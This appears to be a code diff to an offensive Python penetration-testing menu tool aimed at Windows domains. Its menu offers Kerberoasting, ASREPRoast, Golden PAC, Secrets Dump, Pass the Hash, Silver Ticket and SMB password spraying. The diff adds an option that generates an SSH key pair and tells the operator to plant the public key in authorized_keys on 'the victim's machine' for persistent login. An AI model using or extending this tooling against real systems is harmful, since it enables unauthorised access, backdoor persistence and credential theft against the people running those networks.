@@ -261,12 +261,12 @@ def display():
    print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2563')
 
 def options():
-   print('\u2551' + "(0) REMOTE IP SCANNER  (10) Re/Set WINCOMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Golden PAC   (60) GenUSERList (70)          (80) FTP     " + '\u2551')
-   print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Domain Dump  (61) GenPASSList (71)          (81) SSH     " + '\u2551')
-   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY  (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) BloodHound   (62) USER Editor (72)          (82) SQSH    " + '\u2551')
-   print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection  (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) ACLPwn       (63) PASS Editor (73)          (83) MySQL   " + '\u2551')
-   print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) Secrets Dump (64) PASpray SMB (74)          (84) Telnet  " + '\u2551')
-   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER  (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65)             (75)          (85) Netcat  " + '\u2551')
+   print('\u2551' + "(0) REMOTE IP SCANNER  (10) Re/Set WINCOMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Golden PAC   (60) GenSSH Keys (70)          (80) FTP     " + '\u2551')
+   print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Domain Dump  (61) GenUSERList (71)          (81) SSH     " + '\u2551')
+   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY  (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) BloodHound   (62) GenPassList (72)          (82) SQSH    " + '\u2551')
+   print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection  (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) ACLPwn       (63) USER Editor (73)          (83) MySQL   " + '\u2551')
+   print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) Secrets Dump (64) PASS Editor (74)          (84) Telnet  " + '\u2551')
+   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER  (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65) PASpray SMB (75)          (85) Netcat  " + '\u2551')
    print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap Slow & Full  (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) PSExec HASH  (66)             (76)          (86) WinRM   " + '\u2551')
    print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Intense TCP  (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67)             (77)          (87) RDesktop" + '\u2551')
    print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Sub-Domains  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68)             (78)          (88) XFreerdp" + '\u2551')
@@ -2169,6 +2169,27 @@ while True:
          command("gpp-decrypt " + AES256)
       prompt()
 
+#------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Active
+# Details : Menu option selected - Exit(1)
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='60':
+      print("[*] Generating Keys...\n")
+      command("ssh-keygen -t rsa -b 4096 -N '' -f './specialkeys' >/dev/null 2>&1")
+      command("tput setaf 2; tput bold")
+      command("cat specialkeys.pub")
+      command("tput sgr0; tput dim")
+      print("\n[+] Insert the above into authorized_keys on the victim's machine...")
+      if USR[:2] == "''":
+         print("[+] Then ssh login with this command:- ssh -i specialkeys user@" + TIP.rstrip(" ") +"...")
+      else:
+         print("[+] Then ssh login with this command:- ssh -i specialkeys " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "...")
+      prompt()
+
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -2177,7 +2198,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='60':
+   if selection =='61':
       if TIP[:5] != "EMPTY":
          redirect = input("[*] Please enter the URL to parse or press ENTER to use defualt IP address: ")
          if redirect == "":
@@ -2206,7 +2227,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='61':
+   if selection =='62':
       if TIP[:5] != "EMPTY":
          redirect = input("[*] Please enter the URL to parse or press ENTER to use defualt IP address: ")
          if redirect == "":
@@ -2231,7 +2252,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='62':
+   if selection =='63':
       command("nano usernames.txt")
       for x in range (0, MAXX):
          USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
@@ -2246,7 +2267,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='63':
+   if selection =='64':
       command("nano passwords.txt")
       prompt()
 
@@ -2258,7 +2279,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='64':
+   if selection =='65':
       CheckParams = 0   
 
       if TIP[:5] == "EMPTY":
@@ -2289,17 +2310,6 @@ while True:
          OutLoop -= 1
          InLoop = Reset
       prompt() 
-      
-#------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Active
-# Details : Menu option selected - Exit(1)
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='65':
-      exit(1)
             
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2623,6 +2633,9 @@ while True:
       command("echo " + LTM  + " >> config.txt")  
       command("echo " + DIR  + " >> config.txt")   
       os.remove("usernames.txt")
+      if os.path.exists("specialkeys.pub"):
+         os.remove("specialkeys.pub")
+         os.remove("specialkeys")
       if os.path.exists("usernames2.txt"):
          os.remove("usernames2.txt")      
       os.remove("passwords.txt")
